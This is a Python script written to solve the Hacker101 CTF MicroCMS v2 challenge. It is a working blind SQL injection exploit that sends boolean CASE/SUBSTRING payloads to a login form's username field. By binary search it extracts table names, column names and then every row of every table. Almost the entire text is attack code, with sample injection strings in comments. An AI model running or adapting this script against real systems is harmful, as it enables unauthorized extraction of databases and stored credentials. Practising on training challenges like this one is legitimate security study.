# BUGS

#!/usr/bin/python3
# Script to solve hacker101 ctf MicroCMS v2
# Having issues with sqlmap so reused my blindsqli script for that attack accordingly
import sys
import requests
import string
from colorama import Fore


def check(response: requests.Response) -> bool:
    html = response.text
    if html.find('Invalid password') != -1:   # means sorted by title
        return True
    else:
        return False

def send_p(url, query):
    payload = {"username": query, "password": ""}
    try:
        valid = check(requests.post(url, data=payload, timeout=10))
    except requests.exceptions.ConnectTimeout:
        print("[!] ConnectionTimeout: Try to adjust the timeout time")
        sys.exit(1)
    return valid

## ' OR (SELECT CASE WHEN ('a'='b') THEN 1=1 ELSE 1=2 END) -- -

## ' OR (SELECT CASE WHEN SUBSTRING((@@version),1,1) = '1' THEN 1=1 ELSE 1=2 END) -- -
def binsearch(addr, query_payload,info_name):
    url = f"{addr}/login"
    print(f'Retrieving {info_name}')
    data = ""
    # if info_name.lower() == 'flag':
    password_len = 38
    
    

    # Printable characters
    characters = [chr(i) for i in range(33, 127)]
    
    for i in range(1 , password_len):
        high = len(characters) - 1
        low = 0
        mid = (high + low) // 2
        while low <= high:
            h = characters[mid]
            query = f"' OR (SELECT CASE WHEN SUBSTRING(({query_payload}),{i},1) < '{h}' THEN 1=1 ELSE 1=2 END) -- -"

            resp = send_p(url, query)
            if resp == True:
                high = mid - 1
            else:
                low = mid + 1
            mid = (high + low) // 2
            
        h = characters[low - 1]
        query = f"' OR (SELECT CASE WHEN SUBSTRING(({query_payload}),{i},1) = '{h}' THEN 1=1 ELSE 1=2 END) -- -"
        resp = send_p(url, query)
        if resp == True:
            data += characters[low - 1]
            print(data)
        else:
            break
    print(f"{Fore.GREEN}[+] {info_name}: {data}{Fore.RESET}")
    return data

if __name__ == "__main__":
    if len(sys.argv) == 1:
        print(f"Usage: {sys.argv[0]} http[s]://MACHINE_IP/HOST_NAME:PORT")
        sys.exit(0)
    
    table_name_query = "SELECT GROUP_CONCAT(table_name) FROM information_schema.tables WHERE table_name NOT LIKE 'mysql%'"
    table_names = binsearch(sys.argv[1],table_name_query,'table_names:')
    
    table_names = table_names.split(',')
    tables_cols = {}
    for table_name in table_names:
        table_col_query = f"SELECT GROUP_CONCAT(column_name) FROM information_schema.columns WHERE table_name = '{table_name}'"
        table_cols = binsearch(sys.argv[1],table_col_query,f'table:{table_name} columns:')
        tables_cols[table_name] = table_cols.split(',')
        # print(table_name_query.split(','))
    
    for table_name, cols in tables_cols.items():
        for col in cols:
            print(f"Data from table:{table_name} column:{col}")
            table_col_info_query = f"SELECT GROUP_CONCAT({col}) FROM {table_name}"
            table_cols_data = binsearch(sys.argv[1],table_col_info_query,f'table:{table_name} column:{col} data:')
    
